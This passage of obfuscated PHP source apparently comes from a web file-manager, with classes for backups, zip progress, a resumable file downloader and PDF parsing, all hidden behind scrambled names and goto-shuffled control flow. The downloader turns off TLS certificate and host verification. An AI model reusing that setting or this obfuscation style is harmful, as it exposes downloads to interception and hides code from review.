"\142\141\x63\153\165\x70\137{$EÕø„£ÑÕÕ}\57"); goto Fİ¥Ñ÷¹¾ì; CØÊô°„…ø: Backup::set(array($fÒÂ™—¤›ƒ[732] => $béî¡İÊàÍ[$fÒÂ™—¤›ƒ[77]])); IO::move($aØª½¤Èàò, $FœàÒšÜÛ); $EíõƒÓƒæÅ = CONTROLLER_DIR . $fÒÂ™—¤›ƒ[733]; goto aˆŒäâÁš•; Fİ¥Ñ÷¹¾ì: $A±µÈ›Â = new TaskFileTransfer($fÒÂ™—¤›ƒ[730], $fÒÂ™—¤›ƒ[715], 0, LNG($fÒÂ™—¤›ƒ[716]) . $fÒÂ™—¤›ƒ[412] . LNG($fÒÂ™—¤›ƒ[718]) . $fÒÂ™—¤›ƒ[731]); $A±µÈ›Â->addPath($aØª½¤Èàò); $béî¡İÊàÍ = IO::infoWithChildren($aØª½¤Èàò); goto CØÊô°„…ø; aˆŒäâÁš•: $eÃİ¢ì—Áí = CONTROLLER_DIR . $fÒÂ™—¤›ƒ[734]; IO::copy($EíõƒÓƒæÅ, $FœàÒšÜÛ . "\x62\141\143\x6b\x75\160\137{$EÕø„£ÑÕÕ}\x2f"); IO::copy($eÃİ¢ì—Áí, $FœàÒšÜÛ . "\x62\141\x63\x6b\x75\160\137{$EÕø„£ÑÕÕ}\57"); goto Eäâ—‹’¦…; Eäâ—‹’¦…: $A±µÈ›Â->end(); Backup::set(array($fÒÂ™—¤›ƒ[735] => $béî¡İÊàÍ[$fÒÂ™—¤›ƒ[77]])); return !0; goto D¥‘Ö—‚Ü; B¥ª­¢´„í: $fÒÂ™—¤›ƒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d¢À„‚Š¸Ü = Backup::get(); $EÕø„£ÑÕÕ = $d¢À„‚Š¸Ü[$fÒÂ™—¤›ƒ[28]]; goto C”Ó‘äë‘; D¥‘Ö—‚Ü: } } class BackupFile { public function __construct() { } public function index() { goto F·Ï—¦ÁÏ·; b‹—©Ê¢Â: $EÎ˜ìßÄÊ´ = $B¨…Ğ÷ÅâÈ = 0; do { $d—°Ôƒä® = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][742]; $C£†„•¼ = Model($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][720])->where($a¯å‡¯í‡×)->field($d—°Ôƒä®)->order($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][743])->selectPage($DàÇº¼µ‹, $CóÉø°‹º); $fâ®©åÌï‘ = !empty($C£†„•¼[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][354]]) ? $C£†„•¼[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][354]] : array(); foreach ($fâ®©åÌï‘ as $FğåÓ¡èÒ) { goto bİ“¬âÁ¯æ; F¢¥á¹Š³Ÿ: if ($Dµ¯¶‘©˜µ >= 1024 * 1024 * 100) { $eƒ³Ğ—‰¿Û = array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][749] => $bç©­’¯, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][750] => $B¨…Ğ÷ÅâÈ, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][751] => $EÎ˜ìßÄÊ´); Backup::set($eƒ³Ğ—‰¿Û); $Dµ¯¶‘©˜µ = $CêÙ±†”½ = 0; } goto F¾ìÄ¼ŒÅ‚; A¡êôÍÌ“: if (IO::exist($c¥ÜÉ‹Ï)) { $E…„”„Í¸->updateFileEnd($FğåÓ¡èÒ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][28]], $FğåÓ¡èÒ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][77]]); } else { $c¥ÜÉ‹Ï = get_path_father($c¥ÜÉ‹Ï); IO::mkdir($c¥ÜÉ‹Ï); if (!IO::copy($BŠºáäİá…, $c¥ÜÉ‹Ï, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][746])) { write_log($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][747] . $BŠºáäİá… . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][748] . $c¥ÜÉ‹Ï . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][478], $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][715]); $A… ˜‹¶‚ = !1; break; } } $bç©­’¯ = $FğåÓ¡èÒ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][419]]; $CêÙ±†”½ += 1; goto b°Šë’È™Å; b°Šë’È™Å: $Dµ¯¶‘©˜µ += $FğåÓ¡èÒ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][77]]; $B¨…Ğ÷ÅâÈ += 1; $EÎ˜ìßÄÊ´ += $FğåÓ¡èÒ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][77]]; goto F¢¥á¹Š³Ÿ; bİ“¬âÁ¯æ: if (!$this->_fileExist($FğåÓ¡èÒ, $dÈ“Ì­™Õß, $A¸£Ş‚ÛÚ‰)) { $E‚êèŞ½Õ‘ -= 1; $cŒ¼¯éÓé -= (int) $FğåÓ¡èÒ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][77]]; write_log("\x66\x69\x6c\145\x20\x6e\157\x74\x20\145\170\151\x73\164\56\146\151\x6c\x65\111\104\72{$FğåÓ¡èÒ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][419]]}\54\40\x70\141\x74\x68\72{$FğåÓ¡èÒ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][75]]}", $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][744]); continue; } $BŠºáäİá… = $FğåÓ¡èÒ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][75]]; $c¥ÜÉ‹Ï = "\173\x69\157\x3a{$f”‚†ã½‡Û[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][685]]}\175" . substr($BŠºáäİá…, strlen("\x7b\x69\157\72{$FğåÓ¡èÒ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][745]]}\x7d")); goto A¡êôÍÌ“; F¾ìÄ¼ŒÅ‚: } $bØÓõâ÷ø = count($fâ®©åÌï‘); $CóÉø°‹º++; } while ($bØÓõâ÷ø == $DàÇº¼µ‹); $E…„”„Í¸->end(); goto b…æ¹ƒ©ñ‹; dØì¤Ì·†¢: $DàÇº¼µ‹ = 1000; $Dµ¯¶‘©˜µ = $CêÙ±†”½ = 0; $dÈ“Ì­™Õß = array(); goto b‹—©Ê¢Â; bè½½¡íÒÀ: Backup::set($eƒ³Ğ—‰¿Û); $this->_fileFilter($dÈ“Ì­™Õß); return !0; goto D½¾¸ÜÀãÆ; d»Ù²Éá…®: $E…„”„Í¸->task[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][692]] = $cŒ¼¯éÓé; $eƒ³Ğ—‰¿Û = array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][740] => $E‚êèŞ½Õ‘, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][741] => $cŒ¼¯éÓé); Backup::set($eƒ³Ğ—‰¿Û); goto då·Ö†½œ—; b…æ¹ƒ©ñ‹: $BÓ¾åÜÆ¯— = $A… ˜‹¶‚ ? 1 : 0; $eƒ³Ğ—‰¿Û = array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][752] => 1, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][449] => time(), $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][702] => $BÓ¾åÜÆ¯—, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][749] => $bç©­’¯, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][741] => $cŒ¼¯éÓé, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][740] => $E‚êèŞ½Õ‘); if ($CêÙ±†”½) { $eƒ³Ğ—‰¿Û[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][750]] = $B¨…Ğ÷ÅâÈ; $eƒ³Ğ—‰¿Û[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][751]] = $EÎ˜ìßÄÊ´; } goto bè½½¡íÒÀ; f°¿âê‘‹Ä: $E‚êèŞ½Õ‘ = (int) Model($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][720])->where($a¯å‡¯í‡×)->count($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][419]); $cŒ¼¯éÓé = (int) Model($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][720])->where($a¯å‡¯í‡×)->sum($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][77]); $E…„”„Í¸ = new TaskFileTransfer($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][738], $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][715], $E‚êèŞ½Õ‘, LNG($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][716]) . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][717] . LNG($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][739])); goto d»Ù²Éá…®; då·Ö†½œ—: $A… ˜‹¶‚ = !0; $A¸£Ş‚ÛÚ‰ = $this->storeIds(); $CóÉø°‹º = 1; goto dØì¤Ì·†¢; F·Ï—¦ÁÏ·: $f”‚†ã½‡Û = Backup::get(); $bç©­’¯ = $f”‚†ã½‡Û[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][281]][$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][167]][$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][419]]; $a¯å‡¯í‡× = array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][420] => array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][736], $bç©­’¯), $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][737] => array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][319], $f”‚†ã½‡Û[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][685]])); goto f°¿âê‘‹Ä; D½¾¸ÜÀãÆ: } private function _fileExist($dÎ¶š‡Áå, &$DÃ¹²Š ä‚, $E±ª©¥‹ì) { goto cÎèèº§Ù·; CÜ±•áïÚĞ: if (IO::exist($a—ÇÙÂòÃ˜)) { $DÃ¹²Š ä‚[] = $dÎ¶š‡Áå[$D¦í’àÃ…‰[419]]; return !1; } $aõ×ñ Ñº = array($D¦í’àÃ…‰[745] => $dÎ¶š‡Áå[$D¦í’àÃ…‰[745]], $D¦í’àÃ…‰[75] => array($D¦í’àÃ…‰[753], "{$a—ÇÙÂòÃ˜}\x25")); $DÌœ¨‰½´È = Model($D¦í’àÃ…‰[720])->where($aõ×ñ Ñº)->field($D¦í’àÃ…‰[420])->select(); goto dáÌôÍè‡¸; cÎèèº§Ù·: $D¦í’àÃ…‰ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $BÆ’£ßãµ = $dÎ¶š‡Áå[$D¦í’àÃ…‰[75]]; if (in_array($dÎ¶š‡Áå[$D¦í’àÃ…‰[419]], $DÃ¹²Š ä‚)) { return !1; } goto b³•ÜÃŒÖ; b³•ÜÃŒÖ: if (!in_array($dÎ¶š‡Áå[$D¦í’àÃ…‰[745]], $E±ª©¥‹ì)) { return !1; } if (IO::exist($BÆ’£ßãµ)) { return !0; } $a—ÇÙÂòÃ˜ = get_path_father($BÆ’£ßãµ); goto CÜ±•áïÚĞ; dáÌôÍè‡¸: $DÃ¹²Š ä‚ = array_merge($DÃ¹²Š ä‚, array_to_keyvalue($DÌœ¨‰½´È, $D¦í’àÃ…‰[33], $D¦í’àÃ…‰[419])); return !1; goto Cñê¶¨ó—×; Cñê¶¨ó—×: } private function _fileFilter($Eïôìæ¥ƒš) { $EÍ¨»‡„îè =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (empty($Eïôìæ¥ƒš)) { return; } $fäõÕ …¶î = array($EÍ¨»‡„îè[419] => array($EÍ¨»‡„îè[7], array_unique($Eïôìæ¥ƒš))); $bô„ÈÃ¢ƒ› = Model($EÍ¨»‡„îè[754])->where($fäõÕ …¶î)->field($EÍ¨»‡„îè[369])->select(); foreach ($bô„ÈÃ¢ƒ› as $C‘ã¾–¿ìŸ) { Model($EÍ¨»‡„îè[754])->remove($C‘ã¾–¿ìŸ[$EÍ¨»‡„îè[369]], !1); } } private function storeIds() { $aÌÓ‚ÌéÅ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c¸“êÄ¦Àã = Model($aÌÓ‚ÌéÅ[697])->listData(); $dìÔàçÏñ± = array(); $FïÏá³´öÚ = $GLOBALS[$aÌÓ‚ÌéÅ[6]][$aÌÓ‚ÌéÅ[84]][$aÌÓ‚ÌéÅ[755]]; foreach ($c¸“êÄ¦Àã as $bœØ±¨îÙˆ) { $F²•É‘´Š„ = strtolower($bœØ±¨îÙˆ[$aÌÓ‚ÌéÅ[90]]); if (!isset($FïÏá³´öÚ[$F²•É‘´Š„])) { continue; } $FŸ¶ÎÊä™ã = $aÌÓ‚ÌéÅ[71] . (isset($FïÏá³´öÚ[$F²•É‘´Š„]) ? $FïÏá³´öÚ[$F²•É‘´Š„] : ucfirst($F²•É‘´Š„)); if (!class_exists($FŸ¶ÎÊä™ã)) { continue; } $dìÔàçÏñ±[] = $bœØ±¨îÙˆ[$aÌÓ‚ÌéÅ[367]]; } return $dìÔàçÏñ±; } } goto F“­ÉÒã‰¹; eæçÜ‚Ê§ñ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $DåçªÊíÖ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; parent::startAfter(); Hook::bind($DåçªÊíÖ[1513], array($this, $DåçªÊíÖ[1508])); $Bì±ä„æøÒ =& $this->task; $Bì±ä„æøÒ[$DåçªÊíÖ[1510]] = $DåçªÊíÖ[1037]; if (!$Bì±ä„æøÒ[$DåçªÊíÖ[1343]]) { $Bì±ä„æøÒ[$DåçªÊíÖ[1343]] = LNG($DåçªÊíÖ[1514]); } } protected function endAfter() { $CÏ¿ŞÁ¼Ê÷ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; parent::endAfter(); Hook::unbind($CÏ¿ŞÁ¼Ê÷[1513], array($this, $CÏ¿ŞÁ¼Ê÷[1508])); } public function updateAfter() { $C½›òÍä“Æ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Eãò’¼é¦ =& $this->task; if (!$Eãò’¼é¦[$C½›òÍä“Æ[973]] || !$Eãò’¼é¦[$C½›òÍä“Æ[692]]) { return; } if ($Eãò’¼é¦[$C½›òÍä“Æ[1510]] == $C½›òÍä“Æ[1037]) { $c»îˆ’ºİº = $Eãò’¼é¦[$C½›òÍä“Æ[1483]]; if ($Eãò’¼é¦[$C½›òÍä“Æ[1484]] != $C½›òÍä“Æ[1037]) { $c»îˆ’ºİº = 0; } $dìØù×¤‡ = ($Eãò’¼é¦[$C½›òÍä“Æ[1487]] + $c»îˆ’ºİº) / $Eãò’¼é¦[$C½›òÍä“Æ[692]]; $Eãò’¼é¦[$C½›òÍä“Æ[1438]] = $dìØù×¤‡ * 0.3; } else { if ($Eãò’¼é¦[$C½›òÍä“Æ[1510]] == $C½›òÍä“Æ[301]) { $dìØù×¤‡ = $Eãò’¼é¦[$C½›òÍä“Æ[987]] / $Eãò’¼é¦[$C½›òÍä“Æ[973]]; $Eãò’¼é¦[$C½›òÍä“Æ[1438]] = 0.3 + $dìØù×¤‡ * 0.5; } else { if ($Eãò’¼é¦[$C½›òÍä“Æ[1510]] == $C½›òÍä“Æ[103]) { $dìØù×¤‡ = 0; if ($Eãò’¼é¦[$C½›òÍä“Æ[1482]]) { $dìØù×¤‡ = $Eãò’¼é¦[$C½›òÍä“Æ[1483]] / $Eãò’¼é¦[$C½›òÍä“Æ[1482]]; } $Eãò’¼é¦[$C½›òÍä“Æ[1438]] = 0.3 + 0.5 + $dìØù×¤‡ * 0.2; } } } if ($Eãò’¼é¦[$C½›òÍä“Æ[1438]] > 0) { $a‚ÙøñøšÓ = timeFloat() - $Eãò’¼é¦[$C½›òÍä“Æ[1440]] - $Eãò’¼é¦[$C½›òÍä“Æ[1443]]; $Eãò’¼é¦[$C½›òÍä“Æ[1444]] = $a‚ÙøñøšÓ * (1 - $Eãò’¼é¦[$C½›òÍä“Æ[1438]]) / $Eãò’¼é¦[$C½›òÍä“Æ[1438]]; } } public function copyFileStart($fÍ–‚Ú„©ƒ, $eØ·˜ö†Ï, $c”ã¬Û‡š…, $Eºë›‘ãÒ‚, $E‚÷·Ï¬‡, $b–’˜ŒïŸ³) { $aµ‰×İ— =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; parent::copyFileStart($fÍ–‚Ú„©ƒ, $eØ·˜ö†Ï, $c”ã¬Û‡š…, $Eºë›‘ãÒ‚, $E‚÷·Ï¬‡, $b–’˜ŒïŸ³); $cÅğó¬‘Ëì =& $this->task; if ($cÅğó¬‘Ëì[$aµ‰×İ—[1510]] == $aµ‰×İ—[301]) { $cÅğó¬‘Ëì[$aµ‰×İ—[1510]] = $aµ‰×İ—[103]; } $this->update(); } public function copyFileEnd($f„¼³ëŠš„, $cÂµÜ‡ğ”, $B¬¬‘‚…–Æ, $FÓ‹º«îƒŞ, $b¿òñŞÊø‚, $Eµ£Öêâ„Â) { $BåÕ¬õõ• =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cãÔ˜ôÄ˜ =& $this->task; $cãÔ˜ôÄ˜[$BåÕ¬õõ•[1483]] = $cãÔ˜ôÄ˜[$BåÕ¬õõ•[1482]]; $cãÔ˜ôÄ˜[$BåÕ¬õõ•[1487]] += $cãÔ˜ôÄ˜[$BåÕ¬õõ•[1482]]; $cãÔ˜ôÄ˜[$BåÕ¬õõ•[1484]] = $BåÕ¬õõ•[33]; $this->update(); } public function nameParse($D¾ºµ¬‘Àå) { $EµŸŞ´ô³¶ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Eİ­Ú·Ä« =& $this->task; if ($Eİ­Ú·Ä«[$EµŸŞ´ô³¶[987]] < $Eİ­Ú·Ä«[$EµŸŞ´ô³¶[973]]) { $b·ßÈË¢¡ = get_path_this($D¾ºµ¬‘Àå); if (strstr($b·ßÈË¢¡, $EµŸŞ´ô³¶[91])) { $Eİ­Ú·Ä«[$EµŸŞ´ô³¶[987]] += 1; } } if ($Eİ­Ú·Ä«[$EµŸŞ´ô³¶[1510]] == $EµŸŞ´ô³¶[1037]) { $Eİ­Ú·Ä«[$EµŸŞ´ô³¶[1510]] = $EµŸŞ´ô³¶[301]; } $Eİ­Ú·Ä«[$EµŸŞ´ô³¶[1480]] = $D¾ºµ¬‘Àå; $this->update(); } } class Downloader { static function start($Cõãá¶¬¤º, $aÛÆ» ØÀ, $a¥®ÎÍÅ¡ì = 10) { goto aá¤²Ã‡ì; böµßÖãµã: if (!$Cõãá¶¬¤º) { return array($BÇ˜‚ØÕæ[1029] => !1, $BÇ˜‚ØÕæ[1031] => $BÇ˜‚ØÕæ[1034]); } if (!$f¸Ü“°Ÿé¬[$BÇ˜‚ØÕæ[1287]] || $f¸Ü“°Ÿé¬[$BÇ˜‚ØÕæ[325]] == 0) { @unlink($A—Ë¤æ‘õ¬); @unlink($aÛÆ» ØÀ); $bÖÌñÒÂê„ = self::fileDownloadFopen($Cõãá¶¬¤º, $aÛÆ» ØÀ, $f¸Ü“°Ÿé¬[$BÇ˜‚ØÕæ[325]]); if ($bÖÌñÒÂê„[$BÇ˜‚ØÕæ[1029]]) { return $bÖÌñÒÂê„; } else { @unlink($A—Ë¤æ‘õ¬); @unlink($aÛÆ» ØÀ); $bÖÌñÒÂê„ = self::fileDownloadCurl($Cõãá¶¬¤º, $aÛÆ» ØÀ, !1, 0, $f¸Ü“°Ÿé¬[$BÇ˜‚ØÕæ[325]]); @unlink($A—Ë¤æ‘õ¬); return $bÖÌñÒÂê„; } } $cÁºää‚ºÕ = is_file($A—Ë¤æ‘õ¬) ? filesize($A—Ë¤æ‘õ¬) : 0; goto a·…Ç„Êì; D²õ§ëßÖ: $A—Ë¤æ‘õ¬ = $aÛÆ» ØÀ . $BÇ˜‚ØÕæ[1516]; if (is_array($Cõãá¶¬¤º)) { $f¸Ü“°Ÿé¬ = $Cõãá¶¬¤º; } else { $f¸Ü“°Ÿé¬ = url_header($Cõãá¶¬¤º); } $Cõãá¶¬¤º = $f¸Ü“°Ÿé¬[$BÇ˜‚ØÕæ[295]]; goto böµßÖãµã; a·…Ç„Êì: $Dã£Õ¢‹†“ = intval($f¸Ü“°Ÿé¬[$BÇ˜‚ØÕæ[325]]); if (file_exists($A—Ë¤æ‘õ¬) && time() - filemtime($A—Ë¤æ‘õ¬) < 3) { return array($BÇ˜‚ØÕæ[1029] => !1, $BÇ˜‚ØÕæ[1031] => $BÇ˜‚ØÕæ[1517]); } $e¢¶ğÄÓŒ¼ = array(); goto D›ÅØ¢±Á; D§µöñ£‡à: if ($bÖÌñÒÂê„[$BÇ˜‚ØÕæ[1029]]) { @unlink($EËŸ¥‰õ”ğ); } return $bÖÌñÒÂê„; goto eõÜ„¹˜…; D‹´ÑÕ¶¶…: if ($cÁºää‚ºÕ > $Dã£Õ¢‹†“) { @unlink($A—Ë¤æ‘õ¬); } file_put_contents($EËŸ¥‰õ”ğ, json_encode($e¢¶ğÄÓŒ¼)); $bÖÌñÒÂê„ = self::fileDownloadCurl($Cõãá¶¬¤º, $aÛÆ» ØÀ, !0, $cÁºää‚ºÕ, $Dã£Õ¢‹†“); goto D§µöñ£‡à; D›ÅØ¢±Á: if (is_file($EËŸ¥‰õ”ğ)) { $eŸº—ƒšÈ = file_get_contents($EËŸ¥‰õ”ğ); $e¢¶ğÄÓŒ¼ = json_decode($eŸº—ƒšÈ, 1); } if (file_exists($aÛÆ» ØÀ) && $Dã£Õ¢‹†“ == filesize($aÛÆ» ØÀ)) { @unlink($A—Ë¤æ‘õ¬); @unlink($EËŸ¥‰õ”ğ); return array($BÇ˜‚ØÕæ[1029] => !0, $BÇ˜‚ØÕæ[1031] => $BÇ˜‚ØÕæ[1518]); } if ($e¢¶ğÄÓŒ¼[$BÇ˜‚ØÕæ[325]] != $Dã£Õ¢‹†“) { $e¢¶ğÄÓŒ¼ = array($BÇ˜‚ØÕæ[325] => $Dã£Õ¢‹†“); } goto D‹´ÑÕ¶¶…; aá¤²Ã‡ì: $BÇ˜‚ØÕæ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!request_url_safe($Cõãá¶¬¤º)) { return array($BÇ˜‚ØÕæ[1029] => !1, $BÇ˜‚ØÕæ[1031] => $BÇ˜‚ØÕæ[1034]); } $EËŸ¥‰õ”ğ = $aÛÆ» ØÀ . $BÇ˜‚ØÕæ[1515]; goto D²õ§ëßÖ; eõÜ„¹˜…: } static function fileDownloadFopen($BæÇÃ’Í³, $aéÉÎø‘Æ—, $D°ƒ†öÉÎ˜ = 0) { $b™è†©·¡Ù =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; @ini_set($b™è†©·¡Ù[1519], $b™è†©·¡Ù[1520]); $eê„í—ƒçÃ = $aéÉÎø‘Æ— . $b™è†©·¡Ù[1516]; set_timeout(); @unlink($eê„í—ƒçÃ); if ($aÄ“¯¢¢ÜÇ = @fopen($BæÇÃ’Í³, $b™è†©·¡Ù[1521])) { goto a‘ã‹”ãØ; d¡¶Ûª±ª›: fclose($aÄ“¯¢¢ÜÇ); self::checkGzip($eê„í—ƒçÃ); if (!@rename($eê„í—ƒçÃ, $aéÉÎø‘Æ—)) { usleep(round(rand(0, 1000) * 50)); @unlink($aéÉÎø‘Æ—); $FˆƒÈ…èÚ = @rename($eê„í—ƒçÃ, $aéÉÎø‘Æ—); if (!$FˆƒÈ…èÚ) { return array($b™è†©·¡Ù[1029] => !1, $b™è†©·¡Ù[1031] => $b™è†©·¡Ù[1525]); } } goto dÅ–‡‹ä×•; a‘ã‹”ãØ: if (!($eİÄ‰‹¯ = @fopen($eê„í—ƒçÃ, $b™è†©·¡Ù[1522]))) { return array($b™è†©·¡Ù[1029] => !1, $b™è†©·¡Ù[1031] => $b™è†©·¡Ù[1523]); } while (!feof($aÄ“¯¢¢ÜÇ)) { if (!file_exists($eê„í—ƒçÃ)) { fclose($eİÄ‰‹¯); return array($b™è†©·¡Ù[1029] => !1, $b™è†©·¡Ù[1031] => $b™è†©·¡Ù[1524]); } clearstatcache(); if ($D°ƒ†öÉÎ˜ > 0 && $D°ƒ†öÉÎ˜ == filesize(iconv_system($eê„í—ƒçÃ))) { break; } fwrite($eİÄ‰‹¯, fread($aÄ“¯¢¢ÜÇ, 1024 * 8), 1024 * 8); } fclose($eİÄ‰‹¯); goto d¡¶Ûª±ª›; dÅ–‡‹ä×•: return array($b™è†©·¡Ù[1029] => !0, $b™è†©·¡Ù[1031] => $b™è†©·¡Ù[690]); goto e¨òÏ½ë…­; e¨òÏ½ë…­: } else { return array($b™è†©·¡Ù[1029] => !1, $b™è†©·¡Ù[1031] => $b™è†©·¡Ù[1526]); } } static function fileDownloadCurl($EŒï–ø—À®, $E›ËÂ”‘ƒõ, $C²Êø¼‹œÏ = false, $aÕ·éï£Ì¡ = 0, $DÄ“ãÕµŒÓ = 0) { goto fİ²õÎ»µ¾; fİ²õÎ»µ¾: $b×è™Š¹…ã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a£İ¨¤¦Ó„ = $E›ËÂ”‘ƒõ . $b×è™Š¹…ã[1516]; set_timeout(); goto dâÄ¾¯ò¦¹; f‚Ñ¾ÌŒßŞ: curl_setopt($a§·®æßÙŒ, CURLOPT_USERAGENT, $b×è™Š¹…ã[1520]); $f²¸ö”‘í® = curl_exec($a§·®æßÙŒ); curl_progress_end($a§·®æßÙŒ); goto f–ã‡®êÛÑ; E¡Ä›’ª·à: if ($c—­“§îÍœ < $DÄ“ãÕµŒÓ && $DÄ“ãÕµŒÓ != 0) { return array($b×è™Š¹…ã[1029] => !1, $b×è™Š¹…ã[1031] => $b×è™Š¹…ã[1517]); } if ($f²¸ö”‘í® && filesize($a£İ¨¤¦Ó„) != 0) { self::checkGzip($a£İ¨¤¦Ó„); if (!@rename($a£İ¨¤¦Ó„, $E›ËÂ”‘ƒõ)) { @unlink($E›ËÂ”‘ƒõ); $f²¸ö”‘í® = @rename($a£İ¨¤¦Ó„, $E›ËÂ”‘ƒõ); if (!$f²¸ö”‘í®) { return array($b×è™Š¹…ã[1029] => !1, $b×è™Š¹…ã[1031] => $b×è™Š¹…ã[1529]); } } return array($b×è™Š¹…ã[1029] => !0, $b×è™Š¹…ã[1031] => $b×è™Š¹…ã[690]); } return array($b×è™Š¹…ã[1029] => !1, $b×è™Š¹…ã[1031] => $b×è™Š¹…ã[1530]); goto Bƒåíª‘„; f–ã‡®êÛÑ: curl_close($a§·®æßÙŒ); fclose($A©¸ÛÎèÅ); $c—­“§îÍœ = filesize(iconv_system($a£İ¨¤¦Ó„)); goto E¡Ä›’ª·à; EÑÙ¤àÂ¤Ø: curl_setopt($a§·®æßÙŒ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($a§·®æßÙŒ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($a§·®æßÙŒ, CURLOPT_SSL_VERIFYHOST, 0); goto AÕ†Ê¢ƒì; AÕ†Ê¢ƒì: curl_setopt($a§·®æßÙŒ, CURLOPT_NOPROGRESS, !1); curl_setopt($a§·®æßÙŒ, CURLOPT_PROGRESSFUNCTION, $b×è™Š¹…ã[1528]); curl_progress_start($a§·®æßÙŒ); goto f‚Ñ¾ÌŒßŞ; dâÄ¾¯ò¦¹: $A©¸ÛÎèÅ = @fopen($a£İ¨¤¦Ó„, $b×è™Š¹…ã[977]); if (!$A©¸ÛÎèÅ) { return array($b×è™Š¹…ã[1029] => !1, $b×è™Š¹…ã[1031] => $b×è™Š¹…ã[1527]); } $a§·®æßÙŒ = curl_init($EŒï–ø—À®); goto fóøÈÎ´Î; fóøÈÎ´Î: if ($C²Êø¼‹œÏ) { curl_setopt($a§·®æßÙŒ, CURLOPT_RANGE, $aÕ·éï£Ì¡ . $b×è™Š¹…ã[717]); } curl_setopt($a§·®æßÙŒ, CURLOPT_FILE, $A©¸ÛÎèÅ); curl_setopt($a§·®æßÙŒ, CURLOPT_REFERER, get_url_link($EŒï–ø—À®)); goto EÑÙ¤àÂ¤Ø; Bƒåíª‘„: } static function checkGzip($DÇæ óÑ•) { goto BóÅğ÷îê‘; fâÉéÑÙ»ö: ob_start(); readgzfile($DÇæ óÑ•); $b„ì½Öê¶ì = ob_get_clean(); goto B¹Ş‰ÓÂ…; BóÅğ÷îê‘: $CÍ§Ñ¢°Ëº = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1531]; $Fƒ¼¿÷‡‰­ = file_sub_str($DÇæ óÑ•, 0, 2); if ($CÍ§Ñ¢°Ëº != $Fƒ¼¿÷‡‰­) { return; } goto fâÉéÑÙ»ö; B¹Ş‰ÓÂ…: file_put_contents($DÇæ óÑ•, $b„ì½Öê¶ì); goto eÆ¾Ø’ÛÖº; eÆ¾Ø’ÛÖº: } } class FileParsePdf { public static function parse($d…·¢‡ÑÛÒ) { goto dâíª¡‹Ö°; eØ½´á±Í: if ($b—ò¬ˆùÜµ) { $FÄŠÒ¸†¢æ[$eù© âŠå÷[1342]] = $b—ò¬ˆùÜµ[1]; } $FÄŠÒ¸†¢æ[$eù© âŠå÷[1540]] = 0; $D„ÓææÖ… = $eù© âŠå÷[1541]; goto C‚âóÎîË”; dâíª¡‹Ö°: $eù© âŠå÷ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cÉºâ›ï¸… = 32 * 1024; $Dø²¾ªÏê´ = array($eù© âŠå÷[778] => fopen($d…·¢‡ÑÛÒ, $eù© 